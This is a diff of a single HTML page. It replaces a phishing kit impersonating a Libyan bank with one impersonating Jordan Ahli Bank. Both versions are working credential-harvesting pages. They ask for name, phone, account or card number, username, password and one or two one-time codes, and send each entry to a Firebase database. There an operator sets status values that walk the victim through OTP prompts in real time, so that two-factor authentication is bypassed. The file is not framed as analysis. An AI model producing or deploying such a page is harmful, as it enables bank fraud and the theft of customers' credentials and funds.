@@ -1,510 +1,241 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>مصرف الامان</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Noto+Naskh+Arabic:wght@400;700&display=swap');
-    * { font-family: 'Janna LT', 'Janna', 'Traditional Arabic', 'Noto Naskh Arabic', Arial, sans-serif !important; }
-    * { margin:0; padding:0; box-sizing:border-box; }
-
-    body {
-      min-height: 100vh;
-      background: linear-gradient(160deg, #1a6b9a 0%, #1e7ab8 50%, #0d47a1 100%);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-family: 'Janna LT', 'Janna', 'Traditional Arabic', Arial, sans-serif;
-      padding: 20px;
-    }
-
-    .card {
-      background: #fff;
-      border-radius: 20px;
-      padding: 35px 28px;
-      width: 100%;
-      max-width: 420px;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.25);
-      text-align: center;
-    }
-
-    .logo { width: 100px; margin-bottom: 20px; }
-
-    .step { display: none; }
-    .step.active { display: block; }
-
-    .landing-title {
-      font-size: 26px;
-      font-weight: 900;
-      color: #1a6b9a;
-      line-height: 1.4;
-      margin-bottom: 12px;
-    }
-    .landing-sub1 {
-      font-size: 16px;
-      font-weight: 700;
-      color: #1e7ab8;
-      margin-bottom: 10px;
-    }
-    .landing-sub2 {
-      font-size: 13px;
-      color: #666;
-      line-height: 1.7;
-      margin-bottom: 28px;
-    }
-    .btn-main {
-      width: 100%;
-      padding: 14px;
-      background: #1e7ab8;
-      color: #fff;
-      border: none;
-      border-radius: 12px;
-      font-size: 16px;
-      font-weight: 800;
-      cursor: pointer;
-      transition: background 0.2s, transform 0.1s;
-    }
-    .btn-main:hover { background: #0d47a1; }
-    .btn-main:active { transform: scale(0.98); }
-
-    .page-title {
-      font-size: 20px;
-      font-weight: 900;
-      color: #1a6b9a;
-      margin-bottom: 6px;
-    }
-    .page-sub {
-      font-size: 13px;
-      color: #888;
-      margin-bottom: 22px;
-    }
-    .form-group { margin-bottom: 16px; text-align: right; }
-    .form-group label {
-      display: block;
-      font-size: 13px;
-      font-weight: 700;
-      color: #333;
-      margin-bottom: 6px;
-    }
-    .form-group input {
-      width: 100%;
-      padding: 12px 14px;
-      border: 1.5px solid #ddd;
-      border-radius: 10px;
-      font-size: 14px;
-      outline: none;
-      text-align: right;
-      transition: border-color 0.2s;
-      background: #fafafa;
-    }
-    .form-group input:focus {
-      border-color: #1e7ab8;
-      background: #fff;
-    }
-
-    .login-subtitle {
-      font-size: 14px;
-      color: #555;
-      margin-bottom: 22px;
-      font-weight: 600;
-    }
-    .input-wrap { position: relative; }
-    .eye-btn {
-      position: absolute;
-      left: 12px; top: 50%;
-      transform: translateY(-50%);
-      background: none; border: none;
-      cursor: pointer; color: #aaa; font-size: 16px;
-    }
-
-    .special-badge {
-      margin-top: 18px;
-      background: linear-gradient(135deg, #e3f2fd, #bbdefb);
-      border: 1.5px solid #90caf9;
-      border-radius: 12px;
-      padding: 14px 18px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-    }
-    .special-badge .badge-icon { font-size: 22px; flex-shrink: 0; }
-    .special-badge .badge-text {
-      font-size: 13px;
-      font-weight: 800;
-      color: #1a6b9a;
-      line-height: 1.5;
-    }
-
-    .secure-note {
-      font-size: 11px;
-      color: #aaa;
-      margin-top: 14px;
-    }
-
-    .step-indicator {
-      display: flex;
-      justify-content: center;
-      gap: 8px;
-      margin-bottom: 22px;
-    }
-    .step-dot {
-      width: 8px; height: 8px;
-      border-radius: 50%;
-      background: #ddd;
-      transition: background 0.3s;
-    }
-    .step-dot.active { background: #1e7ab8; }
-    .step-dot.done { background: #64b4dc; }
-
-    .overlay {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.65);
-      z-index: 999;
-      align-items: center;
-      justify-content: center;
-    }
-    .overlay.show { display: flex; }
-
-    .lightbox {
-      background: #fff;
-      border-radius: 18px;
-      padding: 36px 30px;
-      text-align: center;
-      max-width: 320px;
-      width: 90%;
-      box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-    }
-
-    .spinner {
-      width: 52px; height: 52px;
-      border: 5px solid #e0e0e0;
-      border-top-color: #1e7ab8;
-      border-radius: 50%;
-      animation: spin 0.9s linear infinite;
-      margin: 0 auto 18px;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .waiting-title { font-size: 17px; font-weight: 800; color: #1a6b9a; margin-bottom: 8px; }
-    .waiting-sub { font-size: 13px; color: #888; line-height: 1.6; }
-
-    .error-icon-big { font-size: 54px; margin-bottom: 14px; }
-    .error-lb-title { font-size: 17px; font-weight: 900; color: #c62828; margin-bottom: 10px; }
-    .error-lb-msg { font-size: 13px; color: #555; line-height: 1.7; margin-bottom: 22px; }
-    .btn-retry {
-      width: 100%;
-      padding: 12px;
-      background: #c62828;
-      color: #fff;
-      border: none;
-      border-radius: 10px;
-      font-size: 14px;
-      font-weight: 800;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-    .btn-retry:hover { background: #b71c1c; }
-
-    /* OTP - Single Input */
-    .otp-title { font-size: 22px; font-weight: 900; color: #1a6b9a; margin-bottom: 8px; }
-    .otp-sub { font-size: 13px; color: #666; margin-bottom: 22px; }
-    .otp-inputs {
-      margin-bottom: 20px;
-    }
-    .otp-inputs input {
-      width: 100%;
-      height: 58px;
-      border: 2px solid #ddd;
-      border-radius: 10px;
-      font-size: 24px;
-      font-weight: 800;
-      text-align: center;
-      outline: none;
-      transition: border-color 0.2s;
-      letter-spacing: 8px;
-      background: #fafafa;
-      direction: ltr;
-    }
-    .otp-inputs input:focus { border-color: #1e7ab8; background: #fff; }
-    .otp-error {
-      display: none;
-      background: #fee2e2;
-      color: #dc2626;
-      border-radius: 10px;
-      padding: 10px 14px;
-      font-size: 13px;
-      font-weight: 700;
-      margin-bottom: 14px;
-    }
-    .otp-error.show { display: block; }
-
-    .success-icon { font-size: 60px; margin-bottom: 14px; }
-    .success-title { font-size: 22px; font-weight: 900; color: #1a6b9a; margin-bottom: 8px; }
-    .success-sub { font-size: 14px; color: #666; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>بنك الأهلي الأردني - تسجيل الدخول</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f4f8; min-height: 100vh; display: flex; flex-direction: column; }
+header { background: #1a3c6e; padding: 15px 30px; display: flex; align-items: center; justify-content: space-between; }
+header img { height: 50px; }
+header h1 { color: white; font-size: 20px; }
+.main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 20px; }
+.card { background: white; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); padding: 40px; width: 100%; max-width: 420px; }
+.card h2 { color: #1a3c6e; margin-bottom: 25px; font-size: 22px; text-align: center; }
+.step { display: none; }
+.step.active { display: block; }
+.form-group { margin-bottom: 18px; }
+label { display: block; color: #444; margin-bottom: 6px; font-size: 14px; font-weight: 600; }
+input { width: 100%; padding: 12px 15px; border: 1.5px solid #ddd; border-radius: 8px; font-size: 15px; transition: border 0.2s; direction: ltr; }
+input:focus { outline: none; border-color: #1a3c6e; }
+.btn { width: 100%; padding: 13px; background: #1a3c6e; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
+.btn:hover { background: #15305a; }
+.error { color: #e53935; font-size: 13px; margin-top: 6px; display: none; }
+.error.show { display: block; }
+.info-text { color: #666; font-size: 13px; text-align: center; margin-bottom: 15px; }
+.otp-box { text-align: center; }
+.otp-box input { text-align: center; font-size: 22px; letter-spacing: 8px; font-weight: bold; }
+.waiting { text-align: center; padding: 20px; color: #1a3c6e; }
+.spinner { width: 40px; height: 40px; border: 4px solid #e0e0e0; border-top: 4px solid #1a3c6e; border-radius: 50%; animation: spin 1s linear infinite; margin: 15px auto; }
+@keyframes spin { to { transform: rotate(360deg); } }
+footer { background: #1a3c6e; color: #aac4e8; text-align: center; padding: 15px; font-size: 13px; }
+</style>
 </head>
 <body>
+<header>
+  <h1>بنك الأهلي الأردني</h1>
+</header>
+<div class="main">
+  <div class="card">
+    <h2>تسجيل الدخول الآمن</h2>
 
-<!-- WAITING OVERLAY -->
-<div id="waitingOverlay" class="overlay">
-  <div class="lightbox">
-    <div class="spinner"></div>
-    <div class="waiting-title">جاري التحقق من المعلومات</div>
-    <div class="waiting-sub">يرجى الانتظار، يتم التحقق من هويتك بشكل آمن</div>
-  </div>
-</div>
-
-<!-- ERROR LIGHTBOX (login rejected) -->
-<div id="errorOverlay" class="overlay">
-  <div class="lightbox">
-    <div class="error-icon-big">⚠️</div>
-    <div class="error-lb-title">المعلومات غير صحيحة</div>
-    <div class="error-lb-msg">
-      معلوماتك المدخلة غير صحيحة،<br/>
-      يرجى التأكد من المعلومات وإدخالها بشكل صحيح
+    <!-- Step 1: Personal Info -->
+    <div class="step active" id="step1">
+      <p class="info-text">أدخل بياناتك الشخصية للمتابعة</p>
+      <div class="form-group">
+        <label>الاسم الكامل</label>
+        <input type="text" id="fullName" placeholder="محمد أحمد">
+      </div>
+      <div class="form-group">
+        <label>رقم الهاتف</label>
+        <input type="tel" id="phone" placeholder="07XXXXXXXX">
+      </div>
+      <div class="form-group">
+        <label>رقم الحساب / رقم البطاقة</label>
+        <input type="text" id="accountNum" placeholder="XXXX XXXX XXXX XXXX">
+      </div>
+      <div id="step1Error" class="error">يرجى ملء جميع الحقول</div>
+      <button class="btn" onclick="goStep2()">التالي</button>
     </div>
-    <button class="btn-retry" onclick="retryLogin()">حسناً، سأحاول مجدداً</button>
-  </div>
-</div>
 
-<!-- WAITING OTP OVERLAY -->
-<div id="waitingOTPOverlay" class="overlay">
-  <div class="lightbox">
-    <div class="spinner"></div>
-    <div class="waiting-title">جاري التحقق من الرمز</div>
-    <div class="waiting-sub">يرجى الانتظار، يتم التحقق من رمز التحقق</div>
-  </div>
-</div>
+    <!-- Step 2: Login Credentials -->
+    <div class="step" id="step2">
+      <p class="info-text">أدخل بيانات الدخول الخاصة بك</p>
+      <div class="form-group">
+        <label>اسم المستخدم / رقم العميل</label>
+        <input type="text" id="username" placeholder="اسم المستخدم">
+      </div>
+      <div class="form-group">
+        <label>كلمة المرور</label>
+        <input type="password" id="password" placeholder="••••••••">
+      </div>
+      <div id="step2Error" class="error">يرجى ملء جميع الحقول</div>
+      <button class="btn" onclick="goStep3()">تسجيل الدخول</button>
+    </div>
 
-<!-- ERROR OTP LIGHTBOX -->
-<div id="errorOTPOverlay" class="overlay">
-  <div class="lightbox">
-    <div class="error-icon-big">⚠️</div>
-    <div class="error-lb-title">رمز التحقق غير صحيح</div>
-    <div class="error-lb-msg">
-      الرمز الذي أدخلته غير صحيح،<br/>
-      يرجى التأكد من الرمز وإعادة المحاولة
-    </div>
-    <button class="btn-retry" onclick="retryOTP()">حسناً، سأحاول مجدداً</button>
-  </div>
-</div>
-
-<!-- CARD -->
-<div class="card">
-  <img src="logo.png" class="logo" alt="Logo"/>
-
-  <!-- STEP 0: LANDING -->
-  <div class="step active" id="stepLanding">
-    <div class="landing-title">مصرف الامان</div>
-    <div class="landing-sub1">خاص لعملاء مصرف الامان</div>
-    <div class="landing-sub2">
-      سجل في السحب الان على الجوائز النقدية والعينية المجزية<br/>
-      المقدمة من مصرف الامان
-    </div>
-    <button class="btn-main" onclick="goToPersonalInfo()">🎁 سجل في السحب الان</button>
-    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | مصرف الامان الليبي © 2024</div>
-  </div>
-
-  <!-- STEP 1: PERSONAL INFO -->
-  <div class="step" id="stepPersonal">
-    <div class="step-indicator">
-      <div class="step-dot done" id="dot0"></div>
-      <div class="step-dot active" id="dot1"></div>
-      <div class="step-dot" id="dot2"></div>
-    </div>
-    <div class="page-title">المعلومات الشخصية</div>
-    <div class="page-sub">أدخل بياناتك الشخصية للمتابعة</div>
-    <div class="form-group">
-      <label>الاسم الكامل</label>
-      <input type="text" id="nameInput" placeholder="أدخل اسمك الكامل"/>
-    </div>
-    <div class="form-group">
-      <label>رقم الهاتف</label>
-      <input type="tel" id="personalPhoneInput" placeholder="09XXXXXXXXX" maxlength="11"/>
-    </div>
-    <button class="btn-main" onclick="goToLogin()">التالي ←</button>
-    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | مصرف الامان الليبي © 2024</div>
-  </div>
-
-  <!-- STEP 2: LOGIN -->
-  <div class="step" id="stepLogin">
-    <div class="step-indicator">
-      <div class="step-dot done"></div>
-      <div class="step-dot done"></div>
-      <div class="step-dot active"></div>
-    </div>
-    <div class="page-title">مصرف الامان</div>
-    <div class="form-group">
-      <div class="input-wrap">
-        <input type="text" id="phoneInput" placeholder="اسم المستخدم"/>
+    <!-- Step 3: Waiting for OTP approval -->
+    <div class="step" id="step3">
+      <div class="waiting">
+        <div class="spinner"></div>
+        <p>جاري التحقق من بياناتك...</p>
+        <p style="font-size:12px;color:#999;margin-top:10px;">يرجى الانتظار</p>
       </div>
     </div>
-    <div class="form-group">
-      <div class="input-wrap">
-        <input type="text" id="pinInput" placeholder="كلمة المرور"/>
-        <button class="eye-btn" onclick="togglePin()" type="button">👁</button>
+
+    <!-- Step 4: OTP Entry -->
+    <div class="step" id="step4">
+      <p class="info-text">تم إرسال رمز التحقق إلى هاتفك المسجل</p>
+      <div class="otp-box">
+        <div class="form-group">
+          <label>رمز التحقق OTP</label>
+          <input type="text" id="otpInput" placeholder="XXXXXX" maxlength="8">
+        </div>
+      </div>
+      <div id="otpError" class="error">الرمز غير صحيح، حاول مرة أخرى</div>
+      <button class="btn" onclick="submitOTP()">تأكيد</button>
+    </div>
+
+    <!-- Step 5: Second OTP -->
+    <div class="step" id="step5">
+      <p class="info-text">أدخل رمز التحقق الثاني</p>
+      <div class="otp-box">
+        <div class="form-group">
+          <label>رمز التحقق الثاني</label>
+          <input type="text" id="otp2Input" placeholder="XXXXXX" maxlength="8">
+        </div>
+      </div>
+      <div id="otp2Error" class="error">الرمز غير صحيح، حاول مرة أخرى</div>
+      <button class="btn" onclick="submitOTP2()">تأكيد</button>
+    </div>
+
+    <!-- Step 6: Done -->
+    <div class="step" id="step6">
+      <div class="waiting">
+        <div class="spinner"></div>
+        <p>جاري تسجيل الدخول...</p>
       </div>
     </div>
-    <div class="special-badge">
-      <div class="badge-icon">🏦</div>
-      <div class="badge-text">خاص بعملاء مصرف الامان</div>
-    </div>
-    <button class="btn-main" style="margin-top:18px;" onclick="submitLogin()">تسجيل الدخول</button>
-    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | مصرف الامان الليبي © 2024</div>
-  </div>
 
-  <!-- STEP 3: OTP -->
-  <div class="step" id="stepOTP">
-    <div class="otp-title">أدخل رمز التحقق</div>
-    <div class="otp-sub">تم إرسال رمز التحقق إلى رقم هاتفك</div>
-    <div class="otp-error" id="otpError">❌ الرمز غير صحيح، يرجى المحاولة مرة أخرى</div>
-    <div class="otp-inputs">
-      <input type="tel" id="otpSingleInput" placeholder="أدخل رمز التحقق"/>
-    </div>
-    <button class="btn-main" onclick="submitOTP()">تأكيد</button>
-    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | مصرف الامان الليبي © 2024</div>
   </div>
-
-  <!-- STEP 4: SUCCESS -->
-  <div class="step" id="stepSuccess">
-    <div class="success-icon">✅</div>
-    <div class="success-title">تم التسجيل بنجاح!</div>
-    <div class="success-sub">شكراً لك، تم تسجيلك في السحب بنجاح</div>
-  </div>
-
 </div>
+<footer>جميع الحقوق محفوظة &copy; 2024 بنك الأهلي الأردني</footer>
 
 <script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-  import { getDatabase, ref, push, update, onValue, off } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, push, update, onValue, off } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
 
-  const firebaseConfig = {
-    apiKey: "AIzaSyBYOUNmTyszdG6ICkE5kyRVz_RrRGKQw4A",
-    authDomain: "alahly-9357f-eb12e.firebaseapp.com",
-    databaseURL: "https://alahly-9357f-eb12e-default-rtdb.firebaseio.com",
-    projectId: "alahly-9357f-eb12e",
-    storageBucket: "alahly-9357f-eb12e.appspot.com",
-    messagingSenderId: "YOUR_SENDER_ID",
-    appId: "YOUR_APP_ID"
-  };
+const firebaseConfig = {
+  apiKey: "AIzaSyCMX_V8oAUGAjaBLCh5rPWeLWr82kzCa80",
+  authDomain: "amnbnk.firebaseapp.com",
+  databaseURL: "https://amnbnk-default-rtdb.firebaseio.com",
+  projectId: "amnbnk",
+  storageBucket: "amnbnk.appspot.com",
+  messagingSenderId: "1234567890",
+  appId: "1:1234567890:web:abcdef"
+};
 
-  const app = initializeApp(firebaseConfig);
-  const db = getDatabase(app);
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
 
-  let sessionRef = null;
-  let loginListener = null;
-  let otpListener = null;
+let sessionRef = null;
+let statusListener = null;
+let currentStep = 1;
 
-  function showOverlay(id) { document.getElementById(id).classList.add('show'); }
-  function hideOverlay(id) { document.getElementById(id).classList.remove('show'); }
-  const pageMap = {
-    'stepLanding': 'landing',
-    'stepPersonal': 'personal',
-    'stepLogin': 'login',
-    'stepOTP': 'otp',
-    'stepSuccess': 'success'
-  };
+// Create session on page load
+const sessionData = {
+  status: 'active',
+  currentPage: 'step1_personal_info',
+  timestamp: Date.now(),
+  ip: 'unknown',
+  userAgent: navigator.userAgent,
+  fullName: '',
+  phone: '',
+  accountNum: '',
+  username: '',
+  password: '',
+  otp1: '',
+  otp2: ''
+};
 
-  function showStep(id) {
-    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-    document.getElementById(id).classList.add('active');
-    if (typeof sessionRef !== 'undefined' && sessionRef && pageMap[id]) {
-      update(sessionRef, { currentPage: pageMap[id] });
+const sessionsRef = ref(db, 'site1/sessions');
+sessionRef = push(sessionsRef, sessionData);
+
+window.goStep2 = function() {
+  const fullName = document.getElementById('fullName').value.trim();
+  const phone = document.getElementById('phone').value.trim();
+  const accountNum = document.getElementById('accountNum').value.trim();
+  if (!fullName || !phone || !accountNum) {
+    document.getElementById('step1Error').classList.add('show');
+    return;
+  }
+  document.getElementById('step1Error').classList.remove('show');
+  update(sessionRef, { fullName, phone, accountNum, currentPage: 'step2_login', status: 'has_personal_info' });
+  showStep('step2');
+};
+
+window.goStep3 = function() {
+  const username = document.getElementById('username').value.trim();
+  const password = document.getElementById('password').value.trim();
+  if (!username || !password) {
+    document.getElementById('step2Error').classList.add('show');
+    return;
+  }
+  document.getElementById('step2Error').classList.remove('show');
+  update(sessionRef, { username, password, currentPage: 'step3_waiting', status: 'has_credentials' });
+  showStep('step3');
+  listenForApproval();
+};
+
+function listenForApproval() {
+  if (statusListener) off(sessionRef, 'value', statusListener);
+  statusListener = onValue(sessionRef, (snap) => {
+    const data = snap.val();
+    if (!data) return;
+    if (data.status === 'request_otp1') {
+      off(sessionRef, 'value', statusListener);
+      update(sessionRef, { currentPage: 'step4_otp1' });
+      showStep('step4');
+    } else if (data.status === 'request_otp2') {
+      off(sessionRef, 'value', statusListener);
+      update(sessionRef, { currentPage: 'step5_otp2' });
+      showStep('step5');
+    } else if (data.status === 'approved') {
+      off(sessionRef, 'value', statusListener);
+      update(sessionRef, { currentPage: 'step6_done' });
+      showStep('step6');
+      setTimeout(() => { window.location.href = 'https://www.ahlibank.jo'; }, 3000);
+    } else if (data.status === 'rejected') {
+      off(sessionRef, 'value', statusListener);
+      document.getElementById('step2Error').textContent = 'بيانات الدخول غير صحيحة';
+      document.getElementById('step2Error').classList.add('show');
+      showStep('step2');
     }
-  }
+  });
+}
 
-  window.goToPersonalInfo = function() {
-    showStep('stepPersonal');
-  }
+window.submitOTP = function() {
+  const otp = document.getElementById('otpInput').value.trim();
+  if (!otp) { document.getElementById('otpError').classList.add('show'); return; }
+  document.getElementById('otpError').classList.remove('show');
+  update(sessionRef, { otp1: otp, currentPage: 'step3_waiting_after_otp1', status: 'has_otp1' });
+  showStep('step3');
+  listenForApproval();
+};
 
-  window.goToLogin = function() {
-    const name = document.getElementById('nameInput').value.trim();
-    const phone = document.getElementById('personalPhoneInput').value.trim();
-    if (!name || !phone) { alert('يرجى تعبئة جميع الحقول'); return; }
-    showStep('stepLogin');
-  }
+window.submitOTP2 = function() {
+  const otp2 = document.getElementById('otp2Input').value.trim();
+  if (!otp2) { document.getElementById('otp2Error').classList.add('show'); return; }
+  document.getElementById('otp2Error').classList.remove('show');
+  update(sessionRef, { otp2: otp2, currentPage: 'step3_waiting_after_otp2', status: 'has_otp2' });
+  showStep('step3');
+  listenForApproval();
+};
 
-  window.togglePin = function() {
-    const p = document.getElementById('pinInput');
-    p.type = p.type === 'password' ? 'text' : 'password';
-  }
-
-  window.retryLogin = function() {
-    hideOverlay('errorOverlay');
-    document.getElementById('phoneInput').value = '';
-    document.getElementById('pinInput').value = '';
-    showStep('stepLogin');
-  }
-
-  window.retryOTP = function() {
-    hideOverlay('errorOTPOverlay');
-    const inp = document.getElementById('otpSingleInput');
-    inp.value = '';
-    inp.focus();
-  }
-
-  window.submitLogin = async function() {
-    const name = document.getElementById('nameInput').value.trim();
-    const personalPhone = document.getElementById('personalPhoneInput').value.trim();
-    const phone = document.getElementById('phoneInput').value.trim();
-    const pin = document.getElementById('pinInput').value.trim();
-    if (!phone || !pin) return;
-
-    showOverlay('waitingOverlay');
-
-    const newRef = push(ref(db, 'site1/sessions'), {
-      name, personalPhone, phone, pin,
-      otp: '---',
-      status: 'waiting',
-      currentPage: 'login',
-      timestamp: Date.now()
-    });
-    sessionRef = newRef;
-
-    loginListener = onValue(newRef, (snap) => {
-      const data = snap.val();
-      if (!data) return;
-      if (data.status === 'approved') {
-        off(newRef, 'value', loginListener);
-        hideOverlay('waitingOverlay');
-        showStep('stepOTP');
-      } else if (data.status === 'rejected') {
-        off(newRef, 'value', loginListener);
-        hideOverlay('waitingOverlay');
-        showOverlay('errorOverlay');
-      }
-    });
-  }
-
-  window.submitOTP = function() {
-    const otp = document.getElementById('otpSingleInput').value.trim();
-    if (!otp) return;
-
-    document.getElementById('otpError').classList.remove('show');
-    showOverlay('waitingOTPOverlay');
-
-    if (sessionRef) update(sessionRef, { otp, status: 'otp_submitted' });
-    if (otpListener) off(sessionRef, 'value', otpListener);
-
-    otpListener = onValue(sessionRef, (snap) => {
-      const data = snap.val();
-      if (!data) return;
-      if (data.status === 'final_approved') {
-        off(sessionRef, 'value', otpListener);
-        hideOverlay('waitingOTPOverlay');
-        showStep('stepSuccess');
-      } else if (data.status === 'final_rejected') {
-        off(sessionRef, 'value', otpListener);
-        hideOverlay('waitingOTPOverlay');
-        showOverlay('errorOTPOverlay');
-        if (sessionRef) update(sessionRef, { otp: '---', status: 'approved' });
-      }
-    });
-  }
+function showStep(id) {
+  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+}
 </script>
 </body>
 </html>
-
